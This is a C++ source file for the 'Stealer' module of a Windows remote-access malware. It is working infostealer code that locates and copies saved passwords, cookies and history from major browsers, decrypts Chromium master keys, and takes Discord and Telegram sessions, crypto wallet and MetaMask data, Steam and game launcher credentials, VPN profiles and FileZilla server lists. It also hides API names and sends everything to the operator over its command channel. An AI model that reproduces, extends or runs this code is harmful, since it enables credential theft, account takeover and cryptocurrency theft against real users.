#include "stealer.h"
#include "core.h"
#include <shlobj.h>
#include <fstream>
#include <algorithm>
#include <vector>
#include <string>
#include <windows.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <map>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "netapi32.lib")

#ifndef TYPE_STEALER_RESULT
#define TYPE_STEALER_RESULT 0xE1
#endif
#define TYPE_STEALER_FINISH 0xE2

// --- Obfuscation Implementation ---

static std::string GetObfStr(int id) {
    if (id == 0) return "Login Data";
    if (id == 1) return "Cookies";
    if (id == 2) return "Web Data";
    if (id == 3) return "Local State";
    if (id == 4) return "History";
    if (id == 5) return "wallet";
    if (id == 6) return "passphrase";
    if (id == 7) return "Crypt32.dll";
    if (id == 8) return "CryptUnprotectData";
    return "";
}

typedef BOOL (WINAPI *P_CRYPTUNPROTECTDATA)(
    DATA_BLOB* pDataIn,
    LPWSTR* ppszDataDescr,
    DATA_BLOB* pOptionalEntropy,
    PVOID pvReserved,
    CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct,
    DWORD dwFlags,
    DATA_BLOB* pDataOut
);

// --- Helper Implementation ---

static std::string GetEnv(const char* var) {
    char buf[MAX_PATH] = {0};
    GetEnvironmentVariableA(var, buf, MAX_PATH);
    return std::string(buf);
}

static std::string ExecCmd(const char* cmd) {
    std::string result = ""; char buffer[128];
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) return "N/A";
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) result += buffer;
    _pclose(pipe); return result;
}

static std::vector<BYTE> B64Decode(const std::string& in) {
    std::vector<BYTE> out;
    std::vector<int> T(256, -1);
    const char* chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for (int i = 0; i < 64; i++) T[(unsigned char)chars[i]] = i;
    int val = 0, valb = -8;
    for (unsigned char c : in) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(BYTE((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

static std::string ToHexStr(const std::vector<BYTE>& data) {
    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (BYTE b : data) ss << std::setw(2) << (int)b;
    return ss.str();
}

void Stealer::SendLog(const std::string& msg) {
    std::string m = "[Stealer] " + msg + "\n";
    SendPacket(TYPE_SHELL_OUT, m.c_str(), (int)m.length());
}

bool Stealer::Contains(const std::string& str, const std::string& sub) {
    if (str.empty() || sub.empty()) return false;
    auto it = std::search(str.begin(), str.end(), sub.begin(), sub.end(), [](char a, char b) { return toupper(a) == toupper(b); });
    return (it != str.end());
}

StealerConfig Stealer::ParseConfig(const std::string& json) {
    StealerConfig c = {true, true, true, true, true, true, true, true, true, true, true};
    if (json.empty()) return c;
    c.passwords = Contains(json, "\"passwords\":true");
    c.cookies = Contains(json, "\"cookies\":true");
    c.history = Contains(json, "\"history\":true");
    c.autofills = Contains(json, "\"autofills\":true");
    c.discord = Contains(json, "\"discord\":true");
    c.telegram = Contains(json, "\"telegram\":true");
    c.wallets = Contains(json, "\"wallets\":true");
    c.games = Contains(json, "\"games\":true");
    c.sysinfo = Contains(json, "\"sysinfo\":true");
    c.vpns = Contains(json, "\"vpns\":true");
    c.ftp = Contains(json, "\"ftp\":true");
    return c;
}

void Stealer::SendFile(const std::string& cat, const std::string& name, const std::string& path) {
    if(GetFileAttributesA(path.c_str()) == INVALID_FILE_ATTRIBUTES) return;
    char t[MAX_PATH]; GetTempPathA(MAX_PATH, t);
    std::string tmp = std::string(t) + "ghst_" + std::to_string(GetTickCount()) + "_" + name;
    if (CopyFileA(path.c_str(), tmp.c_str(), FALSE)) {
        HANDLE h = CreateFileA(tmp.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if(h != INVALID_HANDLE_VALUE) {
            DWORD sz = GetFileSize(h, 0);
            if(sz > 0 && sz < 100*1024*1024) { 
                std::vector<char> buf(sz); DWORD rd;
                if(ReadFile(h, buf.data(), sz, &rd, 0)) {
                    std::string tag = cat + "::" + name;
                    int nl = (int)tag.length();
                    std::vector<char> pkt(4 + nl + sz);
                    memcpy(pkt.data(), &nl, 4);
                    memcpy(pkt.data() + 4, tag.c_str(), nl);
                    memcpy(pkt.data() + 4 + nl, buf.data(), sz);
                    SendPacket(TYPE_STEALER_RESULT, pkt.data(), (int)pkt.size());
                }
            }
            CloseHandle(h);
        }
        DeleteFileA(tmp.c_str());
    }
}

void Stealer::SendReport(const std::string& cat, const std::string& name, const std::string& content) {
    if(content.empty()) return;
    std::string tag = cat + "::" + name;
    int nl = (int)tag.length();
    int cl = (int)content.length();
    std::vector<char> pkt(4 + nl + cl);
    memcpy(pkt.data(), &nl, 4);
    memcpy(pkt.data() + 4, tag.c_str(), nl);
    memcpy(pkt.data() + 4 + nl, content.c_str(), cl);
    SendPacket(TYPE_STEALER_RESULT, pkt.data(), (int)pkt.size());
}

std::string Stealer::GetRegistryString(HKEY hKeyRoot, const char* subKey, const char* valueName) {
    HKEY hKey; char value[1024] = {0}; DWORD dataSize = sizeof(value);
    if (RegOpenKeyExA(hKeyRoot, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, valueName, NULL, NULL, (LPBYTE)value, &dataSize);
        RegCloseKey(hKey);
    }
    return std::string(value);
}

std::vector<std::string> Stealer::ListSubDirectories(const std::string& path) {
    std::vector<std::string> dirs; WIN32_FIND_DATAA fd;
    std::string search = path + "\\*";
    HANDLE h = FindFirstFileA(search.c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) dirs.push_back(fd.cFileName);
            }
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    return dirs;
}

std::string Stealer::DecryptKey(const std::vector<BYTE>& encrypted) {
    HMODULE hCrypt = LoadLibraryA(GetObfStr(7).c_str());
    if (!hCrypt) return "";
    P_CRYPTUNPROTECTDATA pCryptUnprotectData = (P_CRYPTUNPROTECTDATA)GetProcAddress(hCrypt, GetObfStr(8).c_str());
    if (!pCryptUnprotectData) { FreeLibrary(hCrypt); return ""; }
    DATA_BLOB in, out; in.pbData = const_cast<BYTE*>(encrypted.data()); in.cbData = (DWORD)encrypted.size();
    std::string res = "";
    if (pCryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        std::vector<BYTE> dec(out.pbData, out.pbData + out.cbData);
        LocalFree(out.pbData);
        res = ToHexStr(dec);
    }
    FreeLibrary(hCrypt);
    return res;
}

std::string Stealer::GetMasterKey(const std::string& localStatePath) {
    std::ifstream file(localStatePath); if (!file.is_open()) return "";
    std::stringstream buffer; buffer << file.rdbuf(); std::string content = buffer.str();
    std::string keyPattern = "\"encrypted_key\":\"";
    size_t pos = content.find(keyPattern); if (pos == std::string::npos) return "";
    pos += keyPattern.length();
    size_t end = content.find("\"", pos); if (end == std::string::npos) return "";
    std::string b64Key = content.substr(pos, end - pos);
    std::vector<BYTE> decoded = B64Decode(b64Key);
    if (decoded.size() < 5) return "";
    std::vector<BYTE> encrypted(decoded.begin() + 5, decoded.end());
    return DecryptKey(encrypted);
}

void Stealer::StealBrowsers() {
    std::string local = GetEnv("LOCALAPPDATA"), app = GetEnv("APPDATA");
    std::string s_Login = GetObfStr(0), s_Cookie = GetObfStr(1), s_Web = GetObfStr(2), s_Local = GetObfStr(3), s_Hist = GetObfStr(4);
    struct BTarget { std::string name; std::string path; };
    std::vector<BTarget> targets;
    targets.push_back({"Chrome", local + "\\Google\\Chrome\\User Data"});
    targets.push_back({"Edge", local + "\\Microsoft\\Edge\\User Data"});
    targets.push_back({"Brave", local + "\\BraveSoftware\\Brave-Browser\\User Data"});
    targets.push_back({"Opera", app + "\\Opera Software\\Opera Stable"});
    targets.push_back({"OperaGX", app + "\\Opera Software\\Opera GX Stable"});
    targets.push_back({"Vivaldi", local + "\\Vivaldi\\User Data"});
    targets.push_back({"Yandex", local + "\\Yandex\\YandexBrowser\\User Data"});

    for(size_t i=0; i<targets.size(); i++) {
        if (GetFileAttributesA(targets[i].path.c_str()) == INVALID_FILE_ATTRIBUTES) continue;
        std::string mKey = GetMasterKey(targets[i].path + "\\" + s_Local);
        if (!mKey.empty()) SendReport("Browsers", targets[i].name + "_MasterKey.txt", mKey);
        std::vector<std::string> subDirs = ListSubDirectories(targets[i].path);
        for(size_t j=0; j<subDirs.size(); j++) {
            if (subDirs[j] == "Default" || subDirs[j].find("Profile") == 0) {
                std::string pPath = targets[i].path + "\\" + subDirs[j];
                std::string prefix = targets[i].name + "_" + subDirs[j];
                SendFile("Browsers", prefix + "_Login Data", pPath + "\\" + s_Login);
                SendFile("Browsers", prefix + "_Cookies", pPath + "\\Network\\" + s_Cookie);
                SendFile("Browsers", prefix + "_Web Data", pPath + "\\" + s_Web);
                SendFile("Browsers", prefix + "_History", pPath + "\\" + s_Hist);
            }
        }
    }
    std::string ffBase = app + "\\Mozilla\\Firefox\\Profiles";
    std::vector<std::string> ffProfiles = ListSubDirectories(ffBase);
    for(size_t i=0; i<ffProfiles.size(); i++) {
        std::string pp = ffBase + "\\" + ffProfiles[i];
        SendFile("Browsers", "Firefox_" + ffProfiles[i] + "_logins.json", pp + "\\logins.json");
        SendFile("Browsers", "Firefox_" + ffProfiles[i] + "_key4.db", pp + "\\key4.db");
        SendFile("Browsers", "Firefox_" + ffProfiles[i] + "_cookies.sqlite", pp + "\\cookies.sqlite");
        SendFile("Browsers", "Firefox_" + ffProfiles[i] + "_places.sqlite", pp + "\\places.sqlite");
    }
}

void Stealer::StealCommunication() {
    std::string app = GetEnv("APPDATA");
    std::vector<std::string> discPaths;
    discPaths.push_back(app + "\\discord"); discPaths.push_back(app + "\\discordcanary"); discPaths.push_back(app + "\\discordptb");
    for(size_t i=0; i<discPaths.size(); i++) {
        if (GetFileAttributesA(discPaths[i].c_str()) == INVALID_FILE_ATTRIBUTES) continue;
        std::string name = discPaths[i].substr(discPaths[i].find_last_of("\\") + 1);
        std::string mKey = GetMasterKey(discPaths[i] + "\\" + GetObfStr(3));
        if (!mKey.empty()) SendReport("Discord", name + "_MasterKey.txt", mKey);
        std::string ldb = discPaths[i] + "\\Local Storage\\leveldb";
        WIN32_FIND_DATAA fd;
        std::string search = ldb + "\\*";
        HANDLE h = FindFirstFileA(search.c_str(), &fd); 
        if (h != INVALID_HANDLE_VALUE) {
            do {
                if (strstr(fd.cFileName, ".ldb") || strstr(fd.cFileName, ".log"))
                    SendFile("Discord", name + "_" + std::string(fd.cFileName), ldb + "\\" + std::string(fd.cFileName));
            } while (FindNextFileA(h, &fd));
            FindClose(h);
        }
    }
}

void Stealer::StealTelegram() {
    std::string app = GetEnv("APPDATA");
    std::vector<std::string> tPaths;
    tPaths.push_back(app + "\\Telegram Desktop\\tdata"); tPaths.push_back(app + "\\Nekogram\\tdata");
    for(size_t i=0; i<tPaths.size(); i++) {
        if (GetFileAttributesA(tPaths[i].c_str()) == INVALID_FILE_ATTRIBUTES) continue;
        std::string appName = tPaths[i].substr(0, tPaths[i].find("\\tdata"));
        appName = appName.substr(appName.find_last_of("\\") + 1);
        SendFile("Telegram", appName + "_key_datas", tPaths[i] + "\\key_datas");
        std::vector<std::string> subDirs = ListSubDirectories(tPaths[i]);
        for(size_t j=0; j<subDirs.size(); j++) {
             if (subDirs[j].length() == 16) { 
                 std::string mapPath = tPaths[i] + "\\" + subDirs[j];
                 WIN32_FIND_DATAA fd;
                 std::string search = mapPath + "\\map*";
                 HANDLE h = FindFirstFileA(search.c_str(), &fd);
                 if (h != INVALID_HANDLE_VALUE) {
                     do { SendFile("Telegram", appName + "_" + subDirs[j] + "_" + fd.cFileName, mapPath + "\\" + fd.cFileName); } while(FindNextFileA(h, &fd));
                     FindClose(h);
                 }
             }
        }
    }
}

void Stealer::StealWallets() {
    std::string app = GetEnv("APPDATA"), local = GetEnv("LOCALAPPDATA");
    std::string s_Wallet = GetObfStr(5), s_Pass = GetObfStr(6);
    SendFile("Wallets", "Exodus_passphrase.json", app + "\\Exodus\\exodus." + s_Wallet + "\\" + s_Pass + ".json");
    SendFile("Wallets", "Atomic_leveldb", app + "\\atomic\\Local Storage\\leveldb"); 
    SendFile("Wallets", "Jaxx_indexeddb", app + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb");
    SendFile("Wallets", "Electrum_default", app + "\\Electrum\\" + s_Wallet + "s\\default_" + s_Wallet);
    std::map<std::string, std::string> exts;
    exts["nkbihfbeogaeaoehlefnkodbefgpgknn"] = "MetaMask"; exts["fhbohimaelbohpjbbldcngcnapndodjp"] = "Binance";
    std::vector<std::string> bDirs;
    bDirs.push_back(local + "\\Google\\Chrome\\User Data"); bDirs.push_back(local + "\\Microsoft\\Edge\\User Data");
    for(size_t i=0; i<bDirs.size(); i++) {
        if (GetFileAttributesA(bDirs[i].c_str()) == INVALID_FILE_ATTRIBUTES) continue;
        std::vector<std::string> profiles = ListSubDirectories(bDirs[i]);
        for(size_t j=0; j<profiles.size(); j++) {
            if (profiles[j] != "Default" && profiles[j].find("Profile") != 0) continue;
            for(std::map<std::string, std::string>::iterator it = exts.begin(); it != exts.end(); ++it) {
                std::string target = bDirs[i] + "\\" + profiles[j] + "\\Local Extension Settings\\" + it->first;
                if (GetFileAttributesA(target.c_str()) == INVALID_FILE_ATTRIBUTES) continue;
                WIN32_FIND_DATAA fd;
                std::string search = target + "\\*.ldb";
                HANDLE h = FindFirstFileA(search.c_str(), &fd);
                if (h != INVALID_HANDLE_VALUE) {
                    do { SendFile("Wallets", it->second + "_" + profiles[j] + "_" + std::string(fd.cFileName), target + "\\" + std::string(fd.cFileName)); } while (FindNextFileA(h, &fd));
                    FindClose(h);
                }
            }
        }
    }
}

void Stealer::StealVPNs() {
    std::string app = GetEnv("APPDATA"), local = GetEnv("LOCALAPPDATA");
    std::string proton = local + "\\ProtonVPN";
    std::vector<std::string> versions = ListSubDirectories(proton);
    for(size_t i=0; i<versions.size(); i++) {
        std::string vPath = proton + "\\" + versions[i];
        std::vector<std::string> subs = ListSubDirectories(vPath);
        for(size_t j=0; j<subs.size(); j++) {
             std::string cfg = vPath + "\\" + subs[j] + "\\user.config";
             if (GetFileAttributesA(cfg.c_str()) != INVALID_FILE_ATTRIBUTES) SendFile("VPN", "Proton_" + subs[j] + "_user.config", cfg);
        }
    }
    std::string openVpn = app + "\\OpenVPN Connect\\profiles";
    WIN32_FIND_DATAA fd;
    std::string search = openVpn + "\\*.ovpn";
    HANDLE h = FindFirstFileA(search.c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) { do { SendFile("VPN", "OpenVPN_" + std::string(fd.cFileName), openVpn + "\\" + std::string(fd.cFileName)); } while(FindNextFileA(h, &fd)); FindClose(h); }
}

void Stealer::StealFTP() {
    std::string app = GetEnv("APPDATA");
    SendFile("FTP", "FileZilla_recents.xml", app + "\\FileZilla\\recentservers.xml");
    SendFile("FTP", "FileZilla_sites.xml", app + "\\FileZilla\\sitemanager.xml");
}

void Stealer::StealGames() {
    std::string app = GetEnv("APPDATA"), local = GetEnv("LOCALAPPDATA");
    SendFile("Games", "Minecraft_accounts.json", app + "\\.minecraft\\launcher_accounts.json");
    SendFile("Games", "BattleNet_Config", app + "\\Battle.net\\Battle.net.config");
    SendFile("Games", "EpicGames_Config.ini", local + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini");
    std::string steamPath = GetRegistryString(HKEY_CURRENT_USER, "Software\\Valve\\Steam", "SteamPath");
    if (!steamPath.empty()) {
        std::replace(steamPath.begin(), steamPath.end(), '/', '\\');
        SendFile("Games", "Steam_loginusers.vdf", steamPath + "\\config\\loginusers.vdf");
        WIN32_FIND_DATAA fd;
        std::string search = steamPath + "\\ssfn*";
        HANDLE h = FindFirstFileA(search.c_str(), &fd);
        if (h != INVALID_HANDLE_VALUE) { do { SendFile("Games", std::string(fd.cFileName), steamPath + "\\" + std::string(fd.cFileName)); } while (FindNextFileA(h, &fd)); FindClose(h); }
    }
}

std::string DecodeProdKey(const std::vector<BYTE>& raw) {
    if (raw.size() < 67) return "N/A";
    const int start = 52; const char* chars = "BCDFGHJKMPQRTVWXY2346789";
    char decoded[30] = {0}; unsigned char key[15];
    for(int i=0; i<15; i++) key[i] = raw[start + i];
    for (int i = 24; i >= 0; i--) {
        int k = 0; for (int j = 14; j >= 0; j--) { k = (k << 8) ^ key[j]; key[j] = (unsigned char)(k / 24); k %= 24; }
        decoded[i] = chars[k];
        if ((29 - i) % 6 == 0 && i != -1) { i--; if(i>=0) decoded[i] = '-'; }
    }
    return std::string(decoded);
}

std::string Stealer::HTTPGet(std::wstring domain, std::wstring path, std::string token) {
    std::string res = ""; HINTERNET h = InternetOpenW(L"Mozilla/5.0", 0, 0, 0, 0);
    if(h) {
        HINTERNET c = InternetConnectW(h, domain.c_str(), 80, 0, 0, 3, 0, 0);
        if(c) {
            HINTERNET r = HttpOpenRequestW(c, L"GET", path.c_str(), 0, 0, 0, 0, 0);
            if(r) {
                if(!token.empty()) { std::wstring hH = L"Authorization: " + std::wstring(token.begin(), token.end()); HttpAddRequestHeadersW(r, hH.c_str(), (DWORD)-1, 0x20000000); }
                if(HttpSendRequestW(r, 0, 0, 0, 0)) { char b[1024]; DWORD rd; while(InternetReadFile(r, b, 1023, &rd) && rd > 0) { b[rd] = 0; res += b; } }
                InternetCloseHandle(r);
            }
            InternetCloseHandle(c);
        }
        InternetCloseHandle(h);
    }
    return res;
}

void Stealer::StealSystemInfo() {
    std::string info = ""; char buf[MAX_PATH]; DWORD sz = MAX_PATH;
    GetComputerNameA(buf, &sz); info += "PC Name: " + std::string(buf) + "\n";
    sz = MAX_PATH; GetUserNameA(buf, &sz); info += "User: " + std::string(buf) + "\n";
    DWORD vol = 0; GetVolumeInformationA("C:\\", NULL, 0, &vol, NULL, NULL, NULL, 0);
    char hwid[32]; sprintf(hwid, "%X", vol); info += "HWID: " + std::string(hwid) + "\n\n";
    auto clean = [](std::string s) { 
        s.erase(std::remove(s.begin(), s.end(), '\r'), s.end()); s.erase(std::remove(s.begin(), s.end(), '\n'), s.end());
        size_t eq = s.find("="); if(eq != std::string::npos) s = s.substr(eq+1); return s;
    };
    info += "[HARDWARE]\nCPU: " + clean(ExecCmd("wmic cpu get name /value")) + "\nGPU: " + clean(ExecCmd("wmic path win32_VideoController get name /value")) + "\nRAM: " + clean(ExecCmd("wmic computersystem get totalphysicalmemory /value")) + "\n";
    info += "\n[NETWORK]\nPublic IP: " + HTTPGet(L"api.ipify.org", L"/") + "\n";
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &h) == ERROR_SUCCESS) {
        BYTE d[2048]; DWORD s = sizeof(d);
        if (RegQueryValueExA(h, "ProductName", NULL, NULL, d, &s) == ERROR_SUCCESS) info += "OS: " + std::string((char*)d) + "\n";
        s = 2048; if (RegQueryValueExA(h, "DigitalProductId", NULL, NULL, d, &s) == ERROR_SUCCESS) { std::vector<BYTE> raw(d, d + s); info += "Product Key: " + DecodeProdKey(raw) + "\n"; }
        RegCloseKey(h);
    }
    SendReport("System", "SystemInfo.txt", info);
}

void Stealer::Run(const std::string& json) {
    SendLog("Starting Stealer... Config: " + json);
    StealerConfig c = ParseConfig(json);
    if(c.sysinfo) { SendLog("Collecting System Info..."); StealSystemInfo(); }
    if(c.passwords || c.cookies || c.history || c.autofills) { SendLog("Stealing Browsers..."); StealBrowsers(); }
    if(c.discord) { SendLog("Stealing Discord..."); StealCommunication(); }
    if(c.wallets) { SendLog("Stealing Wallets..."); StealWallets(); }
    if(c.games) { SendLog("Stealing Games..."); StealGames(); }
    if(c.telegram) { SendLog("Stealing Telegram..."); StealTelegram(); }
    if(c.vpns) { SendLog("Stealing VPNs..."); StealVPNs(); }
    if(c.ftp) { SendLog("Stealing FTP..."); StealFTP(); }
    SendLog("Stealer Finished.");
    SendPacket(TYPE_STEALER_FINISH, "DONE", 4);
}